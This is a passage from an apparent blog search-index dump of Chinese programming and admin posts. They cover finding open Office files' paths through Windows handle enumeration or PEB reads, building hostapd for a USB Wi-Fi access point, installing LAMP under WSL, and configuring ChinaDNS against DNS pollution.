per process SystemCallInformation, // 0x0018 + (n * 0x0004) SystemConfigurationInformation, // 0x0018 SystemProcessorCounters, // 0x0030 per cpu SystemGlobalFlag, // 0x0004 (fails if size != 4) SystemCallTimeInformation, // not implemented SystemModuleInformation, // 0x0004 + (n * 0x011C) SystemLockInformation, // 0x0004 + (n * 0x0024) SystemStackTraceInformation, // not implemented SystemPagedPoolInformation, // checked build only SystemNonPagedPoolInformation, // checked build only SystemHandleInformation, // 0x0004 + (n * 0x0010) SystemObjectTypeInformation, // 0x0038+ + (n * 0x0030+) SystemPageFileInformation, // 0x0018+ per page file SystemVdmInstemulInformation, // 0x0088 SystemVdmBopInformation, // invalid info class SystemCacheInformation, // 0x0024 SystemPoolTagInformation, // 0x0004 + (n * 0x001C) SystemInterruptInformation, // 0x0000, or 0x0018 per cpu SystemDpcInformation, // 0x0014 SystemFullMemoryInformation, // checked build only SystemLoadDriver, // 0x0018, set mode only SystemUnloadDriver, // 0x0004, set mode only SystemTimeAdjustmentInformation, // 0x000C, 0x0008 writeable SystemSummaryMemoryInformation, // checked build only SystemNextEventIdInformation, // checked build only SystemEventIdsInformation, // checked build only SystemCrashDumpInformation, // 0x0004 SystemExceptionInformation, // 0x0010 SystemCrashDumpStateInformation, // 0x0004 SystemDebuggerInformation, // 0x0002 SystemContextSwitchInformation, // 0x0030 SystemRegistryQuotaInformation, // 0x000C SystemAddDriver, // 0x0008, set mode only SystemPrioritySeparationInformation,// 0x0004, set mode only SystemPlugPlayBusInformation, // not implemented SystemDockInformation, // not implemented SystemPowerInfo, // 0x0060 (XP only!) SystemProcessorSpeedInformation, // 0x000C (XP only!) SystemTimeZoneInformation, // 0x00AC SystemLookasideInformation, // n * 0x0020 SystemSetTimeSlipEvent, SystemCreateSession, // set mode only SystemDeleteSession, // set mode only SystemInvalidInfoClass1, // invalid info class SystemRangeStartInformation, // 0x0004 (fails if size != 4) SystemVerifierInformation, SystemAddVerifier, SystemSessionProcessesInformation, // checked build only MaxSystemInfoClass &#125; SYSTEMINFOCLASS, *PSYSTEMINFOCLASS;","text":"1、获取打开文件的全路径（2）搜索进程空间中的所有句柄，获取句柄的文件名即可。 首先遍历进程寻找打开文件的进程，比如 word.exe 和PowerPoint.exe HANDLE hSnapProcess &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE) { return 1; } PROCESSENTRY32W ProcessEntry; ProcessEntry.dwSize &#x3D; sizeof(ProcessEntry); BOOL bret &#x3D; Process32FirstW(hSnapProcess, &amp;ProcessEntry); WCHAR wszProcessInfo[MAX_PATH] &#x3D; { 0 }; do { WCHAR Name[MAX_PATH] &#x3D; { 0 }; if (!lstrcmp(ProcessEntry.szExeFile, L”POWERPNT.EXE”) | !lstrcmp(ProcessEntry.szExeFile, L”WINWORD.EXE”)) { ……. } 寻找到目标进程以后，获取进程中的句柄 这里利用了未文档化的一个函数 ZwQuerySystemInformation，这是ntdll.dll中的函数 HMODULE hNtDLL = LoadLibrary(L&quot;NTDLL.DLL&quot;); if (!hNtDLL) &#123; return 1; &#125; ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtDLL, &quot;ZwQuerySystemInformation&quot;); typedef NTSTATUS(WINAPI *ZWQUERYSYSTEMINFORMATION)(unsigned long, PVOID, ULONG, PULONG); ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation; 函数原型如下： NTSTATUS WINAPI ZwQuerySystemInformation( _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass, _Inout_ PVOID SystemInformation, _In_ ULONG SystemInformationLength, _Out_opt_ PULONG ReturnLength ); SYSTEM_INFORMATION_CLASS结构体如下： typedef enum _SYSTEMINFOCLASS &#123; SystemBasicInformation, // 0x002C SystemProcessorInformation, // 0x000C SystemPerformanceInformation, // 0x0138 SystemTimeInformation, // 0x0020 SystemPathInformation, // not implemented SystemProcessInformation, // 0x00C8+ per process SystemCallInformation, // 0x0018 + (n * 0x0004) SystemConfigurationInformation, // 0x0018 SystemProcessorCounters, // 0x0030 per cpu SystemGlobalFlag, // 0x0004 (fails if size != 4) SystemCallTimeInformation, // not implemented SystemModuleInformation, // 0x0004 + (n * 0x011C) SystemLockInformation, // 0x0004 + (n * 0x0024) SystemStackTraceInformation, // not implemented SystemPagedPoolInformation, // checked build only SystemNonPagedPoolInformation, // checked build only SystemHandleInformation, // 0x0004 + (n * 0x0010) SystemObjectTypeInformation, // 0x0038+ + (n * 0x0030+) SystemPageFileInformation, // 0x0018+ per page file SystemVdmInstemulInformation, // 0x0088 SystemVdmBopInformation, // invalid info class SystemCacheInformation, // 0x0024 SystemPoolTagInformation, // 0x0004 + (n * 0x001C) SystemInterruptInformation, // 0x0000, or 0x0018 per cpu SystemDpcInformation, // 0x0014 SystemFullMemoryInformation, // checked build only SystemLoadDriver, // 0x0018, set mode only SystemUnloadDriver, // 0x0004, set mode only SystemTimeAdjustmentInformation, // 0x000C, 0x0008 writeable SystemSummaryMemoryInformation, // checked build only SystemNextEventIdInformation, // checked build only SystemEventIdsInformation, // checked build only SystemCrashDumpInformation, // 0x0004 SystemExceptionInformation, // 0x0010 SystemCrashDumpStateInformation, // 0x0004 SystemDebuggerInformation, // 0x0002 SystemContextSwitchInformation, // 0x0030 SystemRegistryQuotaInformation, // 0x000C SystemAddDriver, // 0x0008, set mode only SystemPrioritySeparationInformation,// 0x0004, set mode only SystemPlugPlayBusInformation, // not implemented SystemDockInformation, // not implemented SystemPowerInfo, // 0x0060 (XP only!) SystemProcessorSpeedInformation, // 0x000C (XP only!) SystemTimeZoneInformation, // 0x00AC SystemLookasideInformation, // n * 0x0020 SystemSetTimeSlipEvent, SystemCreateSession, // set mode only SystemDeleteSession, // set mode only SystemInvalidInfoClass1, // invalid info class SystemRangeStartInformation, // 0x0004 (fails if size != 4) SystemVerifierInformation, SystemAddVerifier, SystemSessionProcessesInformation, // checked build only MaxSystemInfoClass &#125; SYSTEMINFOCLASS, *PSYSTEMINFOCLASS; 这个结构再MSDN上只列举了一部分，这是网上搜索的结构，可以访问http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/query.htm查看详细的信息，其包含了我们所需要的一个参数SystemHandleInformation 用来获取系统中进程的句柄信息，第二个参数是缓冲区指针，第三个参数是大小，最后一个参数是实际的返回的数据大小。传入SystemHandleInformation 将会返回一个SYSTEM_HANDLE_INFORMATION结构，结构如下： typedef struct _SYSTEM_HANDLE_INFORMATION &#123; ULONG uCount; SYSTEM_HANDLE aSH[]; &#125; SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION; typedef struct _SYSTEM_HANDLE &#123; ULONG uIdProcess; UCHAR ObjectType; // OB_TYPE_* (OB_TYPE_TYPE, etc.) UCHAR Flags; // HANDLE_FLAG_* (HANDLE_FLAG_INHERIT, etc.) USHORT Handle; PVOID pObject; ACCESS_MASK GrantedAccess; &#125; SYSTEM_HANDLE, *PSYSTEM_HANDLE; 查找句柄对应的进程，获取句柄对应的文件名 通过查询返回句柄的进程pid与传入的PID比较。若符合，OpenProcess 打开该进程，DuplicateHanle复制句柄，然后获取句柄的文件名，然后相对路径转换为绝对路径。获取句柄的详细信息用到了ZwQueryInformationFile 函数，这个函数同样是一个未文档化的函数， HMODULE hNtDLL = LoadLibrary(L&quot;NTDLL.DLL&quot;); if (!hNtDLL) &#123; return 1; &#125; ZwQueryInformationFile = (ZWQUERYINFORMATIONFILE)GetProcAddress(hNtDLL, &quot;ZwQueryInformationFile&quot;); typedef NTSTATUS(WINAPI *ZWQUERYINFORMATIONFILE)(HANDLE, PIO_STATUS_BLOCK, PVOID,ULONG, FILE_INFORMATION_CLASS); ZWQUERYINFORMATIONFILE ZwQueryInformationFile; NTSTATUS ZwQueryInformationFile( IN HANDLE FileHandle, OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID FileInformation, IN ULONG Length, IN FILE_INFORMATION_CLASS FileInformationClass ); 第一个参数是文件句柄，第二个参数是接收最终完成状态的IO_STATUS_BLOCK结构的指针。第三个参数是存储返回的文件对象的信息，第四个参数是缓冲区大小，第五个参数是文件信息的类型，我们传入FileNameInformation。在这里我们定义了一个结构体 PNM_INFO ，用来存储信息 typedef struct _NM_INFO &#123; HANDLE hFile; FILE_NAME_INFORMATION Info; WCHAR Name[MAX_PATH]; &#125; NM_INFO, *PNM_INFO; 第三个成员即为文件名包括路径，不过是相对路径，调用 PathResolve 获取绝对路径。到此文件的全路径就获取到了。","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"获取打开文件的全路径（1）","slug":"获取打开的文件的全路径（1）","date":"2018-04-11T16:00:00.000Z","updated":"2023-07-27T14:32:16.549Z","comments":true,"path":"2018/04/12/获取打开的文件的全路径（1）/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/%E8%8E%B7%E5%8F%96%E6%89%93%E5%BC%80%E7%9A%84%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%A8%E8%B7%AF%E5%BE%84%EF%BC%881%EF%BC%89/","excerpt":"1、获取打开文件的全路径（1）方法：获取进程PEB中的命令行参数信息（问题：如果先打开文件比如word.exe再打开文件，会出现获取不到的情况）步骤： 遍历进程获取打开文件的可执行文件的进程 HANDLE hSnapProcess &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE) { return; } PROCESSENTRY32W ProcessEntry; ProcessEntry.dwSize &#x3D; sizeof(ProcessEntry); BOOL bret &#x3D; Process32FirstW(hSnapProcess, &amp;ProcessEntry); WCHAR wszProcessInfo[MAX_PATH] &#x3D; { 0 }; do { WCHAR Name[MAX_PATH] &#x3D; { 0 }; if (!lstrcmp(ProcessEntry.szExeFile, L”POWERPNT.EXE”)| !lstrcmp(ProcessEntry.szExeFile, L”WINWORD.EXE”)) { HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, false, ProcessEntry.th32ProcessID); do something CloseHandle(hProcess); } } while (Process32NextW(hSnapProcess, &amp;ProcessEntry)); 利用ntdll.dll中一个未公开的函数NtQueryInformationProcess，获取进程信息然后去读对方进程ReadProcessMemory,函数原型如下： NTSTATUS WINAPI NtQueryInformationProcess( In HANDLE ProcessHandle, In PROCESSINFOCLASS ProcessInformationClass, Out PVOID ProcessInformation, In ULONG ProcessInformationLength, Out_opt PULONG ReturnLength ); 第一个参数是进程句柄，第二个参数是获取的进程的信息类型，这里我们选择ProcessBasicInformation,msdn 的声明如下，会返回一个PEB结构体。 第三个参数是输出参数，当参数2是ProcessBasicInformation时，会返回一个PROCESS_BASIC_INFORMATION 结构，结构如下， status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), &amp;ReturnLength); 获取到PROCESS_BASIC_INFORMATION结构体以后，由上可以看出的它的第二个成员就是指向进程PEB结构体的指针，此时调用ReadProcessMemory，获取进程PEB， ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, sizeof(PEB), 0) ReadProcessMemory的函数原型如下： BOOL WINAPI ReadProcessMemory( In HANDLE hProcess, In LPCVOID lpBaseAddress, Out LPVOID lpBuffer, In SIZE_T nSize, Out SIZE_T *lpNumberOfBytesRead ); 通过ReadProcessMemory 获取进程的PEB以后，PEB的结构如下： typedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions; BOOLEAN BeingDebugged; BOOLEAN Spare; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA LoaderData; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID SubSystemData; PVOID ProcessHeap; PVOID FastPebLock; PPEBLOCKROUTINE FastPebLockRoutine; PPEBLOCKROUTINE FastPebUnlockRoutine; ULONG EnvironmentUpdateCount; PVOID* KernelCallbackTable; PVOID EventLogSection; PVOID EventLog; PPEB_FREE_BLOCK FreeList; ULONG TlsExpansionCounter; PVOID TlsBitmap; ULONG TlsBitmapBits[0x2]; PVOID ReadOnlySharedMemoryBase; PVOID ReadOnlySharedMemoryHeap; PVOID* ReadOnlyStaticServerData; PVOID AnsiCodePageData; PVOID OemCodePageData; PVOID UnicodeCaseTableData; ULONG NumberOfProcessors; ULONG NtGlobalFlag; BYTE Spare2[0x4]; LARGE_INTEGER CriticalSectionTimeout; ULONG HeapSegmentReserve; ULONG HeapSegmentCommit; ULONG HeapDeCommitTotalFreeThreshold; ULONG HeapDeCommitFreeBlockThreshold; ULONG NumberOfHeaps; ULONG MaximumNumberOfHeaps; PVOID* *ProcessHeaps; PVOID GdiSharedHandleTable; PVOID ProcessStarterHelper; PVOID GdiDCAttributeList; PVOID LoaderLock; ULONG OSMajorVersion; ULONG OSMinorVersion; ULONG OSBuildNumber; ULONG OSPlatformId; ULONG ImageSubSystem; ULONG ImageSubSystemMajorVersion; ULONG ImageSubSystemMinorVersion; ULONG GdiHandleBuffer[0x22]; ULONG PostProcessInitRoutine; ULONG TlsExpansionBitmap; BYTE TlsExpansionBitmapBits[0x80]; ULONG SessionId; } PEB, *PPEB; 如图标红位置为进程的参数信息，再次调用ReadProcessMemory 获取参数信息，ReadProcessMemory(hProcess, peb.ProcessParameters, &amp;upps, sizeof(RTL_USER_PROCESS_PARAMETERS), 0)) 其中upps是一个RTL_USER_PROCESS_PARAMETERS 的结构体，定义如下： typedef struct _RTL_USER_PROCESS_PARAMETERS { ULONG MaximumLength; ULONG Length;","text":"1、获取打开文件的全路径（1）方法：获取进程PEB中的命令行参数信息（问题：如果先打开文件比如word.exe再打开文件，会出现获取不到的情况）步骤： 遍历进程获取打开文件的可执行文件的进程 HANDLE hSnapProcess &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE) { return; } PROCESSENTRY32W ProcessEntry; ProcessEntry.dwSize &#x3D; sizeof(ProcessEntry); BOOL bret &#x3D; Process32FirstW(hSnapProcess, &amp;ProcessEntry); WCHAR wszProcessInfo[MAX_PATH] &#x3D; { 0 }; do { WCHAR Name[MAX_PATH] &#x3D; { 0 }; if (!lstrcmp(ProcessEntry.szExeFile, L”POWERPNT.EXE”)| !lstrcmp(ProcessEntry.szExeFile, L”WINWORD.EXE”)) { HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, false, ProcessEntry.th32ProcessID); do something CloseHandle(hProcess); } } while (Process32NextW(hSnapProcess, &amp;ProcessEntry)); 利用ntdll.dll中一个未公开的函数NtQueryInformationProcess，获取进程信息然后去读对方进程ReadProcessMemory,函数原型如下： NTSTATUS WINAPI NtQueryInformationProcess( In HANDLE ProcessHandle, In PROCESSINFOCLASS ProcessInformationClass, Out PVOID ProcessInformation, In ULONG ProcessInformationLength, Out_opt PULONG ReturnLength ); 第一个参数是进程句柄，第二个参数是获取的进程的信息类型，这里我们选择ProcessBasicInformation,msdn 的声明如下，会返回一个PEB结构体。 第三个参数是输出参数，当参数2是ProcessBasicInformation时，会返回一个PROCESS_BASIC_INFORMATION 结构，结构如下， status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), &amp;ReturnLength); 获取到PROCESS_BASIC_INFORMATION结构体以后，由上可以看出的它的第二个成员就是指向进程PEB结构体的指针，此时调用ReadProcessMemory，获取进程PEB， ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, sizeof(PEB), 0) ReadProcessMemory的函数原型如下： BOOL WINAPI ReadProcessMemory( In HANDLE hProcess, In LPCVOID lpBaseAddress, Out LPVOID lpBuffer, In SIZE_T nSize, Out SIZE_T *lpNumberOfBytesRead ); 通过ReadProcessMemory 获取进程的PEB以后，PEB的结构如下： typedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions; BOOLEAN BeingDebugged; BOOLEAN Spare; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA LoaderData; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID SubSystemData; PVOID ProcessHeap; PVOID FastPebLock; PPEBLOCKROUTINE FastPebLockRoutine; PPEBLOCKROUTINE FastPebUnlockRoutine; ULONG EnvironmentUpdateCount; PVOID* KernelCallbackTable; PVOID EventLogSection; PVOID EventLog; PPEB_FREE_BLOCK FreeList; ULONG TlsExpansionCounter; PVOID TlsBitmap; ULONG TlsBitmapBits[0x2]; PVOID ReadOnlySharedMemoryBase; PVOID ReadOnlySharedMemoryHeap; PVOID* ReadOnlyStaticServerData; PVOID AnsiCodePageData; PVOID OemCodePageData; PVOID UnicodeCaseTableData; ULONG NumberOfProcessors; ULONG NtGlobalFlag; BYTE Spare2[0x4]; LARGE_INTEGER CriticalSectionTimeout; ULONG HeapSegmentReserve; ULONG HeapSegmentCommit; ULONG HeapDeCommitTotalFreeThreshold; ULONG HeapDeCommitFreeBlockThreshold; ULONG NumberOfHeaps; ULONG MaximumNumberOfHeaps; PVOID* *ProcessHeaps; PVOID GdiSharedHandleTable; PVOID ProcessStarterHelper; PVOID GdiDCAttributeList; PVOID LoaderLock; ULONG OSMajorVersion; ULONG OSMinorVersion; ULONG OSBuildNumber; ULONG OSPlatformId; ULONG ImageSubSystem; ULONG ImageSubSystemMajorVersion; ULONG ImageSubSystemMinorVersion; ULONG GdiHandleBuffer[0x22]; ULONG PostProcessInitRoutine; ULONG TlsExpansionBitmap; BYTE TlsExpansionBitmapBits[0x80]; ULONG SessionId; } PEB, *PPEB; 如图标红位置为进程的参数信息，再次调用ReadProcessMemory 获取参数信息，ReadProcessMemory(hProcess, peb.ProcessParameters, &amp;upps, sizeof(RTL_USER_PROCESS_PARAMETERS), 0)) 其中upps是一个RTL_USER_PROCESS_PARAMETERS 的结构体，定义如下： typedef struct _RTL_USER_PROCESS_PARAMETERS { ULONG MaximumLength; ULONG Length; ULONG Flags; ULONG DebugFlags; HANDLE ConsoleHandle; ULONG ConsoleFlags; HANDLE StandardInput; HANDLE StandardOutput; HANDLE StandardError; CURDIR CurrentDirectory; UNICODE_STRING DllPath; UNICODE_STRING ImagePathName; UNICODE_STRING CommandLine; PVOID Environment; ULONG StartingX; ULONG StartingY; ULONG CountX; ULONG CountY; ULONG CountCharsX; ULONG CountCharsY; ULONG FillAttribute; ULONG WindowFlags; ULONG ShowWindowFlags; UNICODE_STRING WindowTitle; UNICODE_STRING DesktopInfo; UNICODE_STRING ShellInfo; UNICODE_STRING RuntimeData; RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS]; ULONG EnvironmentSize; ULONG EnvironmentVersion; PVOID PackageDependencyData; //8+ ULONG ProcessGroupId; // ULONG LoaderThreads; &#125; RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS; 如上标红位置为命令行信息，UNICODE_STRING同样是一个结构体，定义如下： typedef struct _UNICODE_STRING &#123; USHORT Length; USHORT MaximumLength; PWSTR Buffer; &#125; UNICODE_STRING; typedef UNICODE_STRING *PUNICODE_STRING; 再次调用ReadProcessMemory获取命令行字符串信息，存入buffer中 ReadProcessMemory(hProcess, upps.CommandLine.Buffer, buffer, upps.CommandLine.Length, 0); 到这完整的进程命令行信息就获取到了。通过字符串处理就可以得到相应的打开的文件的全路径了 。","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"linux usb wifi设置AP 模式","slug":"linux usb wifi设置AP 模式 ","date":"2017-12-11T16:00:00.000Z","updated":"2023-07-27T14:35:36.271Z","comments":true,"path":"2017/12/12/linux usb wifi设置AP 模式 /","link":"","permalink":"http://zwjsfdbb.top/2017/12/12/linux%20usb%20wifi%E8%AE%BE%E7%BD%AEAP%20%E6%A8%A1%E5%BC%8F%20/","excerpt":"一.问题阐述 本文是基于Linux 的ubuntu16.04系统来完成的，usb设备是Realteak 的RTL8188EUS的设备（lsusb看到的），因为ubuntu自带的nl90211无法支持此类设备，所以有两种解决办法。 二.解决办法 第一种方法是编译8188eu的驱动，这个在github上有，而且有很多解决办法，编译前需要安装相应的头文件和编译环境，如何你能这样解决的话，当然是最好了，如果这样没能解决，编译失败又解决不来的话，可以换第二种方法。 第二种方法是编译带8188eu的hostapd来实现，具体实现步骤如下： 1.卸载已有的hostapd sudo apt-get autoremove hostapd 2.下载带有rtl8188eu的源码。 wget https://github.com/jenssegers/RTL8188-hostapd/archive/v2.0.tar.gz tar -zxvf v2.0.tar.gz 3.编译 cd RTL8188-hostapd-2.0/hostapd sudo make 4.安装 sudo make install 此时可能你还是无法创建热点，这是因为ubuntu自带的Nerwork Manager 会对热点的创建产生影响，把无线网卡设置为未托管即可。 在/etc/NetworkManager/NetworkManager.conf中添加[keyfile]字段，添加内容为：unmanaged-devices=mac:00:23:cd:10:3e:0b ,mac地址改为自己wifi 设备的地址即可，此时应该就可以创建热点了。 参考链接： https://jenssegers.com/43/Realtek-RTL8188-based-access-point-on-Raspberry-Pi http://os.51cto.com/art/201311/415573.htm","text":"一.问题阐述 本文是基于Linux 的ubuntu16.04系统来完成的，usb设备是Realteak 的RTL8188EUS的设备（lsusb看到的），因为ubuntu自带的nl90211无法支持此类设备，所以有两种解决办法。 二.解决办法 第一种方法是编译8188eu的驱动，这个在github上有，而且有很多解决办法，编译前需要安装相应的头文件和编译环境，如何你能这样解决的话，当然是最好了，如果这样没能解决，编译失败又解决不来的话，可以换第二种方法。 第二种方法是编译带8188eu的hostapd来实现，具体实现步骤如下： 1.卸载已有的hostapd sudo apt-get autoremove hostapd 2.下载带有rtl8188eu的源码。 wget https://github.com/jenssegers/RTL8188-hostapd/archive/v2.0.tar.gz tar -zxvf v2.0.tar.gz 3.编译 cd RTL8188-hostapd-2.0/hostapd sudo make 4.安装 sudo make install 此时可能你还是无法创建热点，这是因为ubuntu自带的Nerwork Manager 会对热点的创建产生影响，把无线网卡设置为未托管即可。 在/etc/NetworkManager/NetworkManager.conf中添加[keyfile]字段，添加内容为：unmanaged-devices=mac:00:23:cd:10:3e:0b ,mac地址改为自己wifi 设备的地址即可，此时应该就可以创建热点了。 参考链接： https://jenssegers.com/43/Realtek-RTL8188-based-access-point-on-Raspberry-Pi http://os.51cto.com/art/201311/415573.htm","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"WIN10 linux 子系统安装lamp","slug":"WIN10 linux 子系统安装lamp ","date":"2017-11-28T16:00:00.000Z","updated":"2023-07-04T14:42:42.429Z","comments":true,"path":"2017/11/29/WIN10 linux 子系统安装lamp /","link":"","permalink":"http://zwjsfdbb.top/2017/11/29/WIN10%20linux%20%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85lamp%20/","excerpt":"1.换源 备份原先的源 cp /etc/apt/sources.list /etc/apt/sources.list.bak vim /etc/apt/sources.list 换成 deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse 更新 apt-get update 2.安装apache2 apt-get install apache2 service apache2 restart 在本地浏览器打开localhost 应该可以看到apache2的欢迎界面 3.安装php 按照ubuntu安装的方法 apt-get install php5是没法用的，不晓得为啥子 我找的解决办法是如下： apt-get install software-properties-common add-apt-repository ppa:ondrej/php apt-get update apt-get install php apt-get install libapache2-mod-php service apache2 restart 4.测试php 在/var/www/html目录下新建test.php 内容如下： &lt;?php phpinfo(); ?&gt; 打开localhost/test.php 正常显示则代表成功 5.至于mysql 的安装，后续再写 ​","text":"1.换源 备份原先的源 cp /etc/apt/sources.list /etc/apt/sources.list.bak vim /etc/apt/sources.list 换成 deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse 更新 apt-get update 2.安装apache2 apt-get install apache2 service apache2 restart 在本地浏览器打开localhost 应该可以看到apache2的欢迎界面 3.安装php 按照ubuntu安装的方法 apt-get install php5是没法用的，不晓得为啥子 我找的解决办法是如下： apt-get install software-properties-common add-apt-repository ppa:ondrej/php apt-get update apt-get install php apt-get install libapache2-mod-php service apache2 restart 4.测试php 在/var/www/html目录下新建test.php 内容如下： &lt;?php phpinfo(); ?&gt; 打开localhost/test.php 正常显示则代表成功 5.至于mysql 的安装，后续再写 ​","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"dns污染的解决","slug":"dns污染的解决","date":"2017-11-14T16:00:00.000Z","updated":"2023-07-04T14:15:12.119Z","comments":true,"path":"2017/11/15/dns污染的解决/","link":"","permalink":"http://zwjsfdbb.top/2017/11/15/dns%E6%B1%A1%E6%9F%93%E7%9A%84%E8%A7%A3%E5%86%B3/","excerpt":"dnsmasq+chinadns+hev-dns-forwarder 1.安装dnsmasq sudo apt-get install dnsmasq 编辑/etc/dnsmasq.conf 取消no-resolv前面的注释 server=127.0.0.1#5354 2.安装chindns https://github.com/shadowsocks/ChinaDNS/releases/download/1.3.2/chinadns-1.3.2.tar.gz 解压 tar -zxf chinadns-1.3.2.tar.gz cd chinadns-1.3.2 .&#x2F;configure make make install 安装结束后在复制到&#x2F;usr&#x2F;local&#x2F;bin 目录中去（可能已经自动复制到了，确认一下） 运行命令为 chinadns -c &#x2F;home&#x2F;pi&#x2F;Desktop&#x2F;chinadns-1.3.2&#x2F;chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m &amp; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 3.安装 git clone https://github.com/aa65535/hev-dns-forwarder cd hev-dns-forwarder make 编译完会在src目录下生成二进制文件，复制到/usr/local/bin目录下 运行命令 hev-dns-forwarder 4.加入开机启动项 在/etc/rc.local中加入 sudo hev-dns-forwarder &amp; &gt; /dev/null 2&gt;&amp;1 sudo chinadns -c /home/pi/Desktop/chinadns-1.3.2/chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m &amp; &gt; /dev/null 2&gt;&amp;1 参考链接：https://blog.bluerain.io/p/SS-Redir-For-Router.html ​","text":"dnsmasq+chinadns+hev-dns-forwarder 1.安装dnsmasq sudo apt-get install dnsmasq 编辑/etc/dnsmasq.conf 取消no-resolv前面的注释 server=127.0.0.1#5354 2.安装chindns https://github.com/shadowsocks/ChinaDNS/releases/download/1.3.2/chinadns-1.3.2.tar.gz 解压 tar -zxf chinadns-1.3.2.tar.gz cd chinadns-1.3.2 .&#x2F;configure make make install 安装结束后在复制到&#x2F;usr&#x2F;local&#x2F;bin 目录中去（可能已经自动复制到了，确认一下） 运行命令为 chinadns -c &#x2F;home&#x2F;pi&#x2F;Desktop&#x2F;chinadns-1.3.2&#x2F;chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m &amp; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 3.安装 git clone https://github.com/aa65535/hev-dns-forwarder cd hev-dns-forwarder make 编译完会在src目录下生成二进制文件，复制到/usr/local/bin目录下 运行命令 hev-dns-forwarder 4.加入开机启动项 在/etc/rc.local中加入 sudo hev-dns-forwarder &amp; &gt; /dev/null 2&gt;&amp;1 sudo chinadns -c /home/pi/Desktop/chinadns-1.3.2/chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m &amp; &gt; /dev/null 2&gt;&amp;1 参考链接：https://blog.bluerain.io/p/SS-Redir-For-Router.html 